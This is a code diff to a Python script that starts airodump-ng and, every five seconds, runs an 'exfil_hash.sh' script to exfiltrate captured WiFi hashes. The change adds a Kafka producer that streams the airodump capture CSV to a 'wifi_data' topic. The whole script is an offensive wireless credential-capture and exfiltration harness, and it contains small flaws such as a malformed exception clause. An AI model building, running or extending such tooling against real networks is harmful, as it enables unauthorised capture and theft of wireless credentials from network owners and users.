@@ -1,6 +1,7 @@
 import subprocess
 import time
 import sys
+import csv
 from kafka import KafkaProducer
 
 # ======================
@@ -25,6 +26,11 @@ EXFIL_INTERVAL = 5  # Interval in seconds to exfiltrate hashes
 # Helper Functions
 # ======================
 
+def read_csv(file_path):
+    """Reads a CSV file and returns its contents as a list of dictionaries."""
+    with open(file_path, mode='r') as file:
+        csv_reader = csv.DictReader(file)
+        return [row for row in csv_reader]
 
 # ======================
 # Main Function
@@ -43,9 +49,15 @@ def main():
     am2 = "./airodump.sh"
     am2p = subprocess.Popen([am2], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     print(f"[*] Started airodump-ng with PID {am2p.pid}")
-    print(f"[*] PusExfiltrating hashes every {EXFIL_INTERVAL} seconds...")
+
+    ### Start Kafka producer subprocess
+    producer = KafkaProducer(bootstrap_servers='localhost:9092')
+
+    print(f"[*] Exfiltrating hashes every {EXFIL_INTERVAL} seconds...")
     while True:
         try:
+            wifi_data = read_csv('airfile-01.csv')
+            producer.send('wifi_data', wifi_data)
             subprocess.run(["./exfil_hash.sh"])
             time.sleep(EXFIL_INTERVAL)
         except Exception or KeyboardInterrupt:
